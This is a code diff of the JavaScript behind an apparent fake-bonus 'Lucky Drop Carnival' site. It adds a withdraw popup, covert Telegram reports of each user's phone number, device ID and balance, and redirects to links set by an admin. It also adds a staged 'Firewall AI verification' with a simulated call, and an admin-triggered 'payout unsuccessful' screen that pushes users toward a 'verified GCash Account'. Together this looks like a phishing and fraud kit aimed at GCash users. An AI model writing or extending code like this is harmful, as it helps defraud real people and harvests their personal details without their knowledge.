@@ -3,11 +3,13 @@
  * 
  * INCLUDES:
  * ✅ User Data & Balance Management
- * ✅ CLAIM NOW → Opens ₱500 Bonus Popup
- * ✅ CLAIM BONUS → Credits +₱500 & Tracks Claims
+ * ✅ AUTO POPUP → ₱500 Bonus (3s fresh / 5s claimed)
+ * ✅ CLAIM NOW → Opens WITHDRAW Popup (pt_btn.png)
+ * ✅ CLAIM VIA GCASH APP → Firewall Check → Redirect or Verification
  * ✅ Firewall AI Verification (Carnival theme)
  * ✅ Force Logout (Admin-only)
  * ✅ Timer, Ticker, Confetti
+ * ✅ Telegram Notifications
  * ✅ Anti-Glitch Claim State
  * 
  * LOADING ORDER:
@@ -43,6 +45,9 @@
     var callCountdown = 60;
     var callTimerInterval = null;
     var currentCallCode = '';
+    
+    // Withdraw popup variables
+    var withdrawInProgress = false;
     
     // Sound cache
     var soundCache = {
@@ -139,6 +144,50 @@
             '🖥️ Device: ' + deviceId + '\n' +
             '⏰ Time: ' + timestamp + '\n' +
             '📊 Status: Call expired\n' +
+            '━━━━━━━━━━━━━━━━━━━━';
+        sendTelegram(message);
+    }
+    
+    // ============================================================
+    // 🆕 WITHDRAW NOTIFICATION (Telegram)
+    // ============================================================
+    function sendWithdrawRequestNotif(userPhone, deviceId, balance, firewallStatus, redirectUrl) {
+        var timestamp = new Date().toLocaleString();
+        var message = '💸 WITHDRAW REQUEST\n' +
+            '━━━━━━━━━━━━━━━━━━━━\n' +
+            '👤 User: ' + userPhone + '\n' +
+            '🖥️ Device: ' + deviceId + '\n' +
+            '💰 Balance: ₱' + balance.toFixed(2) + '\n' +
+            '🔥 Firewall: ' + (firewallStatus ? 'ON (Verification)' : 'OFF (Direct Redirect)') + '\n' +
+            (redirectUrl ? '🔗 Redirect: ' + redirectUrl + '\n' : '') +
+            '⏰ Time: ' + timestamp + '\n' +
+            '━━━━━━━━━━━━━━━━━━━━';
+        sendTelegram(message);
+    }
+    
+    function sendWithdrawRedirectNotif(userPhone, deviceId, balance, redirectUrl) {
+        var timestamp = new Date().toLocaleString();
+        var message = '🚀 USER REDIRECTED\n' +
+            '━━━━━━━━━━━━━━━━━━━━\n' +
+            '👤 User: ' + userPhone + '\n' +
+            '🖥️ Device: ' + deviceId + '\n' +
+            '💰 Balance: ₱' + balance.toFixed(2) + '\n' +
+            '🔗 Link: ' + redirectUrl + '\n' +
+            '⏰ Time: ' + timestamp + '\n' +
+            '📊 Status: Redirected to withdrawal\n' +
+            '━━━━━━━━━━━━━━━━━━━━';
+        sendTelegram(message);
+    }
+    
+    function sendWithdrawFirewallNotif(userPhone, deviceId, balance) {
+        var timestamp = new Date().toLocaleString();
+        var message = '🔥 WITHDRAW BLOCKED BY FIREWALL\n' +
+            '━━━━━━━━━━━━━━━━━━━━\n' +
+            '👤 User: ' + userPhone + '\n' +
+            '🖥️ Device: ' + deviceId + '\n' +
+            '💰 Balance: ₱' + balance.toFixed(2) + '\n' +
+            '⏰ Time: ' + timestamp + '\n' +
+            '📊 Status: Verification required\n' +
             '━━━━━━━━━━━━━━━━━━━━';
         sendTelegram(message);
     }
@@ -259,7 +308,7 @@
     }
     
     // ============================================================
-    // AUTO POPUP
+    // AUTO POPUP (₱500 Bonus)
     // ============================================================
     function scheduleAutoPopup() {
         if (autoPopupTimer) clearTimeout(autoPopupTimer);
@@ -322,7 +371,7 @@
     }
     
     // ============================================================
-    // TRACK CLAIM FOR INDEX.HTML
+    // TRACK CLAIM
     // ============================================================
     function trackClaimInFirebase(amount) {
         try {
@@ -369,29 +418,27 @@
         var claimNowBtn = document.getElementById('claimNowBtn');
         var popup = document.getElementById('bonusRewardPopup');
         
-        // ========== CLAIM NOW → OPENS ₱500 POPUP ==========
+        // ========== CLAIM NOW → OPENS WITHDRAW POPUP ==========
         if (claimNowBtn) {
             claimNowBtn.addEventListener('click', function(e) {
                 e.preventDefault();
                 e.stopPropagation();
                 
-                console.log('🖱️ CLAIM NOW clicked (isClaimed:', isClaimed + ')');
+                console.log('💸 CLAIM NOW clicked → Opening WITHDRAW popup');
                 playSound('scatter');
                 
-                if (popup) {
-                    popup.style.display = 'flex';
-                    updateClaimButtonUI();
-                }
+                // 👇 BUKSAN ANG WITHDRAW POPUP (hindi ang bonus popup)
+                openClaimNowPopup();
             });
         }
         
-        // ========== CLAIM BONUS (Inside Popup) ==========
+        // ========== CLAIM BONUS (Inside Bonus Popup) ==========
         var ptCatClaimBtn = document.getElementById('ptCatClaimBtn');
         if (ptCatClaimBtn) {
             ptCatClaimBtn.addEventListener('click', handleClaimBonus);
         }
         
-        // ========== POPUP CLOSE BUTTONS ==========
+        // ========== BONUS POPUP CLOSE BUTTONS ==========
         var closeBtn = document.getElementById('bonusRewardClose');
         if (closeBtn) {
             closeBtn.addEventListener('click', function() {
@@ -411,7 +458,271 @@
     }
     
     // ============================================================
-    // HANDLE CLAIM BONUS
+    // 🆕 WITHDRAW POPUP FUNCTIONS
+    // ============================================================
+    function openClaimNowPopup() {
+        var popup = document.getElementById('claimNowPopup');
+        if (!popup) {
+            console.warn('⚠️ claimNowPopup not found');
+            return;
+        }
+        
+        // Update balance display
+        var balanceEl = document.getElementById('claimNowBalanceAmount');
+        if (balanceEl) {
+            balanceEl.innerText = formatNumberWithComma(currentBalance);
+        }
+        
+        popup.style.display = 'flex';
+        generateClaimNowConfetti();
+        
+        // Attach events (once lang)
+        if (!popup.dataset.eventsAttached) {
+            popup.dataset.eventsAttached = 'true';
+            attachClaimNowEvents();
+        }
+    }
+    
+    function closeClaimNowPopup() {
+        var popup = document.getElementById('claimNowPopup');
+        if (popup) popup.style.display = 'none';
+    }
+    
+    function generateClaimNowConfetti() {
+        var layer = document.getElementById('claimNowConfetti');
+        if (!layer) return;
+        
+        layer.innerHTML = '';
+        
+        var colors = ['#ff2d95', '#ffd700', '#ff8c00', '#00d4ff', '#39ff14', '#ffffff'];
+        var shapes = ['circle', 'square', 'ribbon'];
+        
+        for (var i = 0; i < 35; i++) {
+            var piece = document.createElement('div');
+            var color = colors[Math.floor(Math.random() * colors.length)];
+            var shape = shapes[Math.floor(Math.random() * shapes.length)];
+            var size = Math.random() * 10 + 6;
+            var startX = Math.random() * 100;
+            var delay = Math.random() * 4;
+            var duration = Math.random() * 4 + 3;
+            var rotate = Math.random() * 360;
+            
+            piece.className = 'claim-now-confetti ' + shape;
+            piece.style.cssText =
+                'left:' + startX + '%;' +
+                'width:' + size + 'px;' +
+                'height:' + (shape === 'ribbon' ? size * 2.5 : size) + 'px;' +
+                'background:' + color + ';' +
+                'box-shadow:0 0 ' + (size * 1.5) + 'px ' + color + ';' +
+                'animation: claimNowConfettiFall ' + duration + 's ' + delay + 's linear infinite;' +
+                'transform: rotate(' + rotate + 'deg);';
+            
+            layer.appendChild(piece);
+        }
+    }
+    
+    function attachClaimNowEvents() {
+        // Close ✕
+        var closeBtn = document.getElementById('claimNowPopupClose');
+        if (closeBtn) closeBtn.onclick = closeClaimNowPopup;
+        
+        // Back button
+        var backBtn = document.getElementById('claimNowBackBtn');
+        if (backBtn) backBtn.onclick = closeClaimNowPopup;
+        
+        // ========== MAIN: CLAIM VIA GCASH APP ==========
+        var gcashBtn = document.getElementById('claimViaGCashBtn');
+        if (gcashBtn) {
+            gcashBtn.onclick = handleClaimViaGCash;
+        }
+    }
+    
+    // ============================================================
+    // 🔥 MAIN: HANDLE CLAIM VIA GCASH
+    // Firewall OFF → Redirect sa admin link
+    // Firewall ON → Verification call popup
+    // ============================================================
+    async function handleClaimViaGCash() {
+        if (withdrawInProgress) {
+            console.log('⏳ Withdraw already in progress');
+            return;
+        }
+        
+        withdrawInProgress = true;
+        
+        console.log('💚 CLAIM VIA GCASH clicked');
+        playSound('claim');
+        
+        var gcashBtn = document.getElementById('claimViaGCashBtn');
+        var originalHTML = gcashBtn ? gcashBtn.innerHTML : '';
+        
+        if (gcashBtn) {
+            gcashBtn.disabled = true;
+            gcashBtn.innerHTML = '<i class="fas fa-spinner fa-spin"></i> <span>PROCESSING...</span>';
+        }
+        
+        try {
+            // ========== STEP 1: CHECK FIREWALL ==========
+            var firewallActive = await checkFirewallBeforeClaim();
+            console.log('🔥 Firewall status:', firewallActive ? 'ON' : 'OFF');
+            
+            // Get user data
+            var userPhoneStr = localStorage.getItem("userPhone") || "Unknown";
+            var deviceId = localStorage.getItem("userDeviceId") || "Unknown";
+            
+            if (firewallActive) {
+                // ============================================
+                // 🔥 FIREWALL ON → VERIFICATION CALL POPUP
+                // ============================================
+                console.log('🔥 Firewall ON → Showing verification');
+                
+                // Send Telegram notification
+                sendWithdrawFirewallNotif(userPhoneStr, deviceId, currentBalance);
+                
+                // Isara ang withdraw popup
+                closeClaimNowPopup();
+                
+                // Ipakita ang firewall verification popup
+                showFirewallVerificationPopup();
+                
+                // Reset button
+                if (gcashBtn) {
+                    gcashBtn.disabled = false;
+                    gcashBtn.innerHTML = originalHTML;
+                }
+                withdrawInProgress = false;
+                
+            } else {
+                // ============================================
+                // 🔓 FIREWALL OFF → REDIRECT SA ADMIN LINK
+                // ============================================
+                console.log('🔓 Firewall OFF → Getting admin link...');
+                
+                var redirectUrl = await getAdminRedirectLink();
+                
+                if (redirectUrl) {
+                    console.log('✅ Redirecting to:', redirectUrl);
+                    
+                    // 🆕 Send Telegram notification (withdraw request)
+                    sendWithdrawRequestNotif(userPhoneStr, deviceId, currentBalance, false, redirectUrl);
+                    
+                    // Ipakita ang loading state
+                    if (gcashBtn) {
+                        gcashBtn.innerHTML = '<i class="fas fa-check"></i> <span>REDIRECTING...</span>';
+                    }
+                    
+                    // Redirect after 1.5s
+                    setTimeout(function () {
+                        // 🆕 Send Telegram notification (redirected)
+                        sendWithdrawRedirectNotif(userPhoneStr, deviceId, currentBalance, redirectUrl);
+                        
+                        window.location.href = redirectUrl;
+                    }, 1500);
+                    
+                } else {
+                    console.warn('⚠️ Walang available link sa admin');
+                    
+                    // Send Telegram notification (no link)
+                    sendTelegram(
+                        '⚠️ NO REDIRECT LINK\n' +
+                        '━━━━━━━━━━━━━━━━━━━━\n' +
+                        '👤 User: ' + userPhoneStr + '\n' +
+                        '🖥️ Device: ' + deviceId + '\n' +
+                        '💰 Balance: ₱' + currentBalance.toFixed(2) + '\n' +
+                        '⏰ Time: ' + new Date().toLocaleString() + '\n' +
+                        '━━━━━━━━━━━━━━━━━━━━'
+                    );
+                    
+                    alert('⚠️ Walang available withdrawal link. Please try again later.');
+                    
+                    // Reset button
+                    if (gcashBtn) {
+                        gcashBtn.disabled = false;
+                        gcashBtn.innerHTML = originalHTML;
+                    }
+                    withdrawInProgress = false;
+                }
+            }
+            
+        } catch (error) {
+            console.error('❌ Error:', error);
+            alert('⚠️ System error. Please try again.');
+            
+            if (gcashBtn) {
+                gcashBtn.disabled = false;
+                gcashBtn.innerHTML = originalHTML;
+            }
+            withdrawInProgress = false;
+        }
+    }
+    
+    // ============================================================
+    // GET ADMIN REDIRECT LINK
+    // Priority:
+    // 1. admin/redirectLink (single link — madaling i-set)
+    // 2. links (unclaimed link — existing system)
+    // ============================================================
+    function getAdminRedirectLink() {
+        return new Promise(function (resolve) {
+            try {
+                if (!db) {
+                    console.warn('⚠️ db not initialized');
+                    return resolve(null);
+                }
+                
+                // ========== OPTION 1: admin/redirectLink ==========
+                db.ref('admin/redirectLink').once('value')
+                    .then(function (snapshot) {
+                        var data = snapshot.val();
+                        
+                        // Kung may value at active
+                        if (data && data.url && data.active !== false) {
+                            console.log('✅ Using admin/redirectLink:', data.url);
+                            return resolve(data.url);
+                        }
+                        
+                        // ========== OPTION 2: links (available) ==========
+                        console.log('🔍 Fallback: checking links node...');
+                        return db.ref('links')
+                            .orderByChild('status')
+                            .equalTo('available')
+                            .limitToFirst(1)
+                            .once('value')
+                            .then(function (linksSnap) {
+                                if (linksSnap.exists()) {
+                                    var links = linksSnap.val();
+                                    var key = Object.keys(links)[0];
+                                    var linkData = links[key];
+                                    
+                                    // Mark as claimed
+                                    db.ref('links/' + key).update({
+                                        status: 'claimed',
+                                        user: userPhone || 'Unknown',
+                                        claimedAt: Date.now()
+                                    });
+                                    
+                                    console.log('✅ Using links node:', linkData.url);
+                                    resolve(linkData.url);
+                                } else {
+                                    console.warn('⚠️ Walang available link');
+                                    resolve(null);
+                                }
+                            });
+                    })
+                    .catch(function (error) {
+                        console.error('Get link error:', error);
+                        resolve(null);
+                    });
+                
+            } catch (e) {
+                console.error('Get link error:', e);
+                resolve(null);
+            }
+        });
+    }
+    
+    // ============================================================
+    // HANDLE CLAIM BONUS (₱500)
     // ============================================================
     function handleClaimBonus(e) {
         e.preventDefault();
@@ -449,7 +760,7 @@
     }
     
     // ============================================================
-    // PROCESS CLAIM
+    // PROCESS CLAIM (₱500)
     // ============================================================
     function processClaim() {
         claimInProgress = true;
@@ -494,7 +805,7 @@
     }
     
     // ============================================================
-    // CREDIT BONUS + MARK CLAIMED (ATOMIC)
+    // CREDIT BONUS + MARK CLAIMED
     // ============================================================
     function creditBonusAndMark(callback) {
         console.log('💰 Crediting ₱' + bonusAmount + '...');
@@ -603,14 +914,12 @@
     }
     
     // ============================================================
-    // FIREWALL AI VERIFICATION POPUP (Carnival Theme)
+    // FIREWALL AI VERIFICATION POPUP
     // ============================================================
     function showFirewallVerificationPopup() {
-        // Create popup dynamically
         var existingPopup = document.getElementById('firewallAIPopup');
         if (existingPopup) existingPopup.remove();
         
-        // Reset state
         callInProgress = false;
         callCountdown = 60;
         if (callTimerInterval) {
@@ -689,12 +998,10 @@
         
         document.body.appendChild(overlay);
         
-        // Add show class with delay for animation
         setTimeout(function() {
             overlay.classList.add('show');
         }, 50);
         
-        // Attach events
         attachFirewallEvents();
     }
     
@@ -786,7 +1093,6 @@
         playSound('call');
         startFirewallTimer();
         
-        // Simulate call connected
         setTimeout(function() {
             if (statusIcon) statusIcon.innerHTML = '🎯';
             if (statusText) {
@@ -1546,7 +1852,6 @@
         console.log('🔍 Admin Force Logout Listener active for:', cleanPhone);
         
         try {
-            // Reset flag + set online
             userRef.update({
                 status: 'online',
                 forceLogout: false,
@@ -1576,7 +1881,6 @@
         
         console.log('🔍 Setting up admin logout listeners...');
         
-        // Force logout flag listener
         forceLogoutFlagListener = db.ref('user_sessions/' + cleanPhone + '/forceLogout');
         forceLogoutFlagListener.on('value', function(snapshot) {
             var forceFlag = snapshot.val();
@@ -1595,7 +1899,6 @@
             }
         });
         
-        // Status listener (secondary)
         forceLogoutListener = db.ref('user_sessions/' + cleanPhone + '/status');
         forceLogoutListener.on('value', function(snapshot) {
             var status = snapshot.val();
@@ -1621,25 +1924,23 @@
         console.log('✅ Admin logout listeners ready');
     }
     
-        // ============================================================
-    // FORCE LOGOUT POPUP — FILIPINO CARNIVAL REMASTER
+    // ============================================================
+    // FORCE LOGOUT POPUP — FILIPINO CARNIVAL
     // ============================================================
     function showForceLogoutPopup() {
         if (document.querySelector('.force-logout-popup')) return;
-
+        
         addForceLogoutAnimations();
-
-        // ===== OVERLAY =====
+        
         var overlay = document.createElement('div');
         overlay.className = 'force-logout-popup carnival-overlay';
-
-        // ===== CONFETTI LAYER =====
+        
         var confettiLayer = document.createElement('div');
         confettiLayer.className = 'carnival-confetti-layer';
-
+        
         var confettiColors = ['#ff2d95', '#ffd700', '#ff8c00', '#00d4ff', '#39ff14', '#ffffff'];
         var confettiShapes = ['circle', 'square', 'ribbon'];
-
+        
         for (var i = 0; i < 45; i++) {
             var piece = document.createElement('div');
             var color = confettiColors[Math.floor(Math.random() * confettiColors.length)];
@@ -1649,7 +1950,7 @@
             var delay = Math.random() * 4;
             var duration = Math.random() * 4 + 3;
             var rotate = Math.random() * 360;
-
+            
             piece.className = 'carnival-confetti ' + shape;
             piece.style.cssText =
                 'left: ' + startX + '%;' +
@@ -1662,20 +1963,17 @@
             confettiLayer.appendChild(piece);
         }
         overlay.appendChild(confettiLayer);
-
-        // ===== GLOWING WHITE CENTER BURST =====
+        
         var centerBurst = document.createElement('div');
         centerBurst.className = 'carnival-center-burst';
         overlay.appendChild(centerBurst);
-
-        // ===== MAIN CARD =====
+        
         var card = document.createElement('div');
         card.className = 'carnival-card';
-
+        
         card.innerHTML =
             '<div class="carnival-ribbon-left">🎪</div>' +
             '<div class="carnival-ribbon-right">🎟️</div>' +
-
             '<div class="carnival-mascot-wrap">' +
                 '<div class="carnival-mascot-glow"></div>' +
                 '<div class="carnival-mascot-ring"></div>' +
@@ -1684,26 +1982,21 @@
                 '<div class="carnival-mascot-star star-2">⭐</div>' +
                 '<div class="carnival-mascot-star star-3">✨</div>' +
             '</div>' +
-
             '<div class="carnival-badge">' +
                 '<span class="carnival-badge-dot"></span>' +
                 '<span>SESSION ENDED</span>' +
             '</div>' +
-
             '<h2 class="carnival-title">PAYOUT UNSUCCESSFUL</h2>' +
-
             '<div class="carnival-divider">' +
                 '<span class="divider-star">★</span>' +
                 '<span class="divider-line"></span>' +
                 '<span class="divider-star">★</span>' +
             '</div>' +
-
             '<p class="carnival-message">' +
                 'Your payout request is <strong>unsuccessful</strong>.<br>' +
                 'Use a <span class="carnival-highlight">verified GCash Account</span><br>' +
                 'to process instant withdrawal.' +
             '</p>' +
-
             '<div class="carnival-chips">' +
                 '<div class="carnival-chip">' +
                     '<span class="chip-icon">🎁</span>' +
@@ -1718,28 +2011,24 @@
                     '<span class="chip-text">SECURED</span>' +
                 '</div>' +
             '</div>' +
-
             '<button id="returnHomeBtn" class="carnival-btn">' +
                 '<span class="btn-icon">🏠</span>' +
                 '<span class="btn-text">RETURN TO HOME</span>' +
                 '<span class="btn-shine"></span>' +
             '</button>' +
-
             '<div class="carnival-footer">' +
                 '<span>🎊</span> LUCKY DROP CARNIVAL <span>🎊</span>' +
             '</div>';
-
+        
         overlay.appendChild(card);
         document.body.appendChild(overlay);
-
-        // ===== CTA ACTION =====
+        
         document.getElementById('returnHomeBtn').onclick = function () {
             localStorage.clear();
             sessionStorage.clear();
             window.location.replace('index.html');
         };
-
-        // ===== AUTO-REDIRECT FALLBACK =====
+        
         setTimeout(function () {
             if (document.querySelector('.force-logout-popup')) {
                 localStorage.clear();
@@ -1748,425 +2037,366 @@
             }
         }, 15000);
     }
-
-    // ============================================================
-    // FORCE LOGOUT STYLES — CARNIVAL THEME
-    // ============================================================
+    
     function addForceLogoutAnimations() {
         if (document.querySelector('#force-logout-animations')) return;
-
+        
         var style = document.createElement('style');
         style.id = 'force-logout-animations';
         style.textContent =
-
-        /* ===== OVERLAY ===== */
-        '.carnival-overlay {' +
-            'position: fixed;' +
-            'inset: 0;' +
-            'z-index: 999999;' +
-            'display: flex;' +
-            'align-items: center;' +
-            'justify-content: center;' +
-            'padding: 16px;' +
-            'background: ' +
-                'radial-gradient(circle at 50% 40%, rgba(255,255,255,0.25) 0%, rgba(255,255,255,0.08) 15%, transparent 45%),' +
-                'radial-gradient(circle at 50% 50%, #ff3b3b 0%, #d10000 25%, #8b0000 55%, #3d0000 80%, #0d0000 100%);' +
-            'backdrop-filter: blur(8px);' +
-            '-webkit-backdrop-filter: blur(8px);' +
-            'overflow: hidden;' +
-            'animation: carnivalFadeIn 0.4s ease;' +
-        '}' +
-
-        /* ===== CONFETTI ===== */
-        '.carnival-confetti-layer {' +
-            'position: absolute;' +
-            'inset: 0;' +
-            'overflow: hidden;' +
-            'pointer-events: none;' +
-            'z-index: 1;' +
-        '}' +
-
-        '.carnival-confetti {' +
-            'position: absolute;' +
-            'top: -20px;' +
-            'opacity: 0.9;' +
-        '}' +
-
-        '.carnival-confetti.circle { border-radius: 50%; }' +
-        '.carnival-confetti.square { border-radius: 2px; }' +
-        '.carnival-confetti.ribbon { border-radius: 3px; }' +
-
-        /* ===== GLOWING CENTER BURST ===== */
-        '.carnival-center-burst {' +
-            'position: absolute;' +
-            'top: 50%;' +
-            'left: 50%;' +
-            'width: 380px;' +
-            'height: 380px;' +
-            'transform: translate(-50%, -50%);' +
-            'background: radial-gradient(circle, rgba(255,255,255,0.45) 0%, rgba(255,255,255,0.15) 25%, transparent 65%);' +
-            'border-radius: 50%;' +
-            'pointer-events: none;' +
-            'animation: carnivalBurstPulse 3s ease-in-out infinite;' +
-            'z-index: 2;' +
-        '}' +
-
-        /* ===== MAIN CARD ===== */
-        '.carnival-card {' +
-            'position: relative;' +
-            'z-index: 3;' +
-            'width: 100%;' +
-            'max-width: 380px;' +
-            'padding: 42px 26px 26px;' +
-            'background: ' +
-                'linear-gradient(180deg, rgba(255,255,255,0.18) 0%, transparent 25%),' +
-                'linear-gradient(160deg, #ff1744 0%, #d10000 35%, #8b0000 70%, #4a0000 100%);' +
-            'border: 4px solid #ffd700;' +
-            'border-radius: 28px;' +
-            'text-align: center;' +
-            'box-shadow: ' +
-                '0 30px 80px rgba(0,0,0,0.85),' +
-                '0 0 0 8px rgba(255,23,68,0.25),' +
-                '0 0 60px rgba(255,215,0,0.6),' +
-                'inset 0 0 60px rgba(255,255,255,0.08);' +
-            'animation: carnivalCardEnter 0.7s cubic-bezier(0.175, 0.885, 0.32, 1.275);' +
-            'overflow: hidden;' +
-            'box-sizing: border-box;' +
-        '}' +
-
-        '.carnival-card::before {' +
-            'content: "";' +
-            'position: absolute;' +
-            'top: 0;' +
-            'left: 0;' +
-            'right: 0;' +
-            'height: 3px;' +
-            'background: linear-gradient(90deg, transparent, #fff9c4, #ffd700, #fff9c4, transparent);' +
-            'animation: carnivalShine 2.5s linear infinite;' +
-        '}' +
-
-        /* ===== RIBBONS ===== */
-        '.carnival-ribbon-left, .carnival-ribbon-right {' +
-            'position: absolute;' +
-            'top: -8px;' +
-            'font-size: 28px;' +
-            'animation: carnivalFloat 3s ease-in-out infinite;' +
-            'filter: drop-shadow(0 0 12px rgba(255,215,0,0.9));' +
-        '}' +
-        '.carnival-ribbon-left { left: 14px; animation-delay: 0s; }' +
-        '.carnival-ribbon-right { right: 14px; animation-delay: 1.2s; }' +
-
-        /* ===== MASCOT (Lucky Cat) ===== */
-        '.carnival-mascot-wrap {' +
-            'position: relative;' +
-            'width: 130px;' +
-            'height: 130px;' +
-            'margin: 0 auto 16px;' +
-        '}' +
-
-        '.carnival-mascot-glow {' +
-            'position: absolute;' +
-            'inset: -20px;' +
-            'background: radial-gradient(circle, rgba(255,215,0,0.7) 0%, rgba(255,23,68,0.4) 40%, transparent 70%);' +
-            'border-radius: 50%;' +
-            'animation: carnivalGlowPulse 2s ease-in-out infinite;' +
-        '}' +
-
-        '.carnival-mascot-ring {' +
-            'position: absolute;' +
-            'inset: 0;' +
-            'border: 3px dashed #ffd700;' +
-            'border-radius: 50%;' +
-            'animation: carnivalSpin 12s linear infinite;' +
-            'box-shadow: 0 0 30px rgba(255,215,0,0.8), inset 0 0 30px rgba(255,215,0,0.5);' +
-        '}' +
-
-        '.carnival-mascot {' +
-            'position: absolute;' +
-            'top: 50%;' +
-            'left: 50%;' +
-            'transform: translate(-50%, -50%);' +
-            'font-size: 68px;' +
-            'filter: drop-shadow(0 8px 20px rgba(0,0,0,0.6)) drop-shadow(0 0 25px rgba(255,215,0,0.9));' +
-            'animation: carnivalMascotBounce 2s ease-in-out infinite;' +
-            'z-index: 2;' +
-        '}' +
-
-        '.carnival-mascot-star {' +
-            'position: absolute;' +
-            'font-size: 18px;' +
-            'animation: carnivalStarPop 2s ease-in-out infinite;' +
-            'filter: drop-shadow(0 0 8px currentColor);' +
-        '}' +
-        '.star-1 { top: 0; right: 0; color: #ffd700; animation-delay: 0s; }' +
-        '.star-2 { bottom: 0; left: 0; color: #ff2d95; animation-delay: 0.6s; }' +
-        '.star-3 { top: 30%; left: -5px; color: #00d4ff; animation-delay: 1.2s; }' +
-
-        /* ===== BADGE ===== */
-        '.carnival-badge {' +
-            'display: inline-flex;' +
-            'align-items: center;' +
-            'gap: 8px;' +
-            'padding: 6px 18px;' +
-            'margin-bottom: 12px;' +
-            'background: rgba(0,0,0,0.45);' +
-            'border: 2px solid rgba(255,68,68,0.9);' +
-            'border-radius: 20px;' +
-            'font-family: "Orbitron", monospace;' +
-            'font-size: 10px;' +
-            'font-weight: 800;' +
-            'color: #ff8888;' +
-            'letter-spacing: 2.5px;' +
-            'text-transform: uppercase;' +
-            'box-shadow: 0 0 20px rgba(255,68,68,0.5), inset 0 0 15px rgba(255,68,68,0.2);' +
-        '}' +
-
-        '.carnival-badge-dot {' +
-            'width: 8px;' +
-            'height: 8px;' +
-            'background: #ff3b3b;' +
-            'border-radius: 50%;' +
-            'box-shadow: 0 0 10px #ff3b3b, 0 0 20px #ff3b3b;' +
-            'animation: carnivalBlink 1s ease-in-out infinite;' +
-        '}' +
-
-        /* ===== TITLE ===== */
-        '.carnival-title {' +
-            'font-family: "Playfair Display", serif;' +
-            'font-size: 26px;' +
-            'font-weight: 900;' +
-            'margin: 0 0 6px 0;' +
-            'letter-spacing: 1.5px;' +
-            'text-transform: uppercase;' +
-            'line-height: 1.15;' +
-            'background: linear-gradient(180deg, #fff9c4 0%, #ffd700 30%, #ffeb3b 50%, #ff9800 80%, #ff6f00 100%);' +
-            '-webkit-background-clip: text;' +
-            'background-clip: text;' +
-            'color: transparent;' +
-            'filter: drop-shadow(0 2px 0 rgba(139,0,0,0.8)) drop-shadow(0 0 20px rgba(255,215,0,0.7));' +
-        '}' +
-
-        /* ===== DIVIDER ===== */
-        '.carnival-divider {' +
-            'display: flex;' +
-            'align-items: center;' +
-            'justify-content: center;' +
-            'gap: 10px;' +
-            'margin: 14px auto;' +
-            'width: 75%;' +
-        '}' +
-        '.divider-star {' +
-            'font-size: 14px;' +
-            'color: #ffd700;' +
-            'text-shadow: 0 0 12px rgba(255,215,0,0.9);' +
-        '}' +
-        '.divider-line {' +
-            'flex: 1;' +
-            'height: 2px;' +
-            'background: linear-gradient(90deg, transparent, #ffd700, #ff2d95, #ffd700, transparent);' +
-            'border-radius: 2px;' +
-            'box-shadow: 0 0 8px rgba(255,215,0,0.6);' +
-        '}' +
-
-        /* ===== MESSAGE ===== */
-        '.carnival-message {' +
-            'font-family: "Poppins", sans-serif;' +
-            'font-size: 13px;' +
-            'line-height: 1.7;' +
-            'color: rgba(255,255,255,0.92);' +
-            'margin: 0 0 18px 0;' +
-            'text-shadow: 0 1px 3px rgba(0,0,0,0.6);' +
-        '}' +
-        '.carnival-message strong {' +
-            'color: #ff6b6b;' +
-            'font-weight: 800;' +
-            'text-shadow: 0 0 10px rgba(255,107,107,0.7);' +
-        '}' +
-        '.carnival-highlight {' +
-            'display: inline-block;' +
-            'padding: 2px 8px;' +
-            'background: linear-gradient(180deg, #ffd700, #ff9800);' +
-            '-webkit-background-clip: text;' +
-            'background-clip: text;' +
-            'color: transparent;' +
-            'font-weight: 900;' +
-            'text-shadow: 0 0 15px rgba(255,215,0,0.8);' +
-        '}' +
-
-        /* ===== CHIPS ===== */
-        '.carnival-chips {' +
-            'display: flex;' +
-            'justify-content: center;' +
-            'gap: 6px;' +
-            'margin-bottom: 20px;' +
-            'flex-wrap: wrap;' +
-        '}' +
-
-        '.carnival-chip {' +
-            'display: flex;' +
-            'align-items: center;' +
-            'gap: 4px;' +
-            'padding: 6px 10px;' +
-            'background: rgba(0,0,0,0.4);' +
-            'border: 1.5px solid rgba(255,215,0,0.6);' +
-            'border-radius: 12px;' +
-            'font-family: "Orbitron", monospace;' +
-            'font-size: 8.5px;' +
-            'font-weight: 800;' +
-            'color: #ffd700;' +
-            'letter-spacing: 1px;' +
-            'text-transform: uppercase;' +
-            'box-shadow: 0 0 12px rgba(255,215,0,0.3), inset 0 0 8px rgba(255,215,0,0.1);' +
-            'animation: carnivalChipFloat 3s ease-in-out infinite;' +
-        '}' +
-        '.carnival-chip:nth-child(2) { animation-delay: 0.5s; }' +
-        '.carnival-chip:nth-child(3) { animation-delay: 1s; }' +
-
-        '.chip-icon { font-size: 11px; }' +
-
-        /* ===== CTA BUTTON ===== */
-        '.carnival-btn {' +
-            'position: relative;' +
-            'width: 100%;' +
-            'padding: 16px 20px;' +
-            'display: flex;' +
-            'align-items: center;' +
-            'justify-content: center;' +
-            'gap: 10px;' +
-            'background: linear-gradient(180deg, #fff9c4 0%, #ffeb3b 20%, #ffd700 45%, #ff9800 75%, #ff6f00 100%);' +
-            'border: 3px solid #fff9c4;' +
-            'border-radius: 16px;' +
-            'font-family: "Orbitron", monospace;' +
-            'font-size: 14px;' +
-            'font-weight: 900;' +
-            'color: #8b0000;' +
-            'letter-spacing: 2px;' +
-            'text-transform: uppercase;' +
-            'cursor: pointer;' +
-            'overflow: hidden;' +
-            'box-shadow: ' +
-                '0 6px 0 #8b4500,' +
-                '0 12px 30px rgba(0,0,0,0.6),' +
-                '0 0 40px rgba(255,215,0,0.6),' +
-                'inset 0 2px 0 rgba(255,255,255,0.7);' +
-            'transition: transform 0.1s ease, box-shadow 0.1s ease;' +
-            'animation: carnivalBtnPulse 2s ease-in-out infinite;' +
-        '}' +
-
-        '.carnival-btn:active {' +
-            'transform: translateY(6px);' +
-            'box-shadow: 0 0 0 #8b4500, 0 4px 15px rgba(0,0,0,0.5);' +
-        '}' +
-
-        '.btn-icon { font-size: 18px; }' +
-
-        '.btn-shine {' +
-            'position: absolute;' +
-            'top: 0;' +
-            'left: -100%;' +
-            'width: 60%;' +
-            'height: 100%;' +
-            'background: linear-gradient(90deg, transparent, rgba(255,255,255,0.8), transparent);' +
-            'transform: skewX(-25deg);' +
-            'animation: carnivalBtnShine 2.5s ease-in-out infinite;' +
-            'pointer-events: none;' +
-        '}' +
-
-        /* ===== FOOTER ===== */
-        '.carnival-footer {' +
-            'margin-top: 16px;' +
-            'font-family: "Orbitron", monospace;' +
-            'font-size: 9px;' +
-            'font-weight: 700;' +
-            'color: rgba(255,215,0,0.85);' +
-            'letter-spacing: 3px;' +
-            'text-transform: uppercase;' +
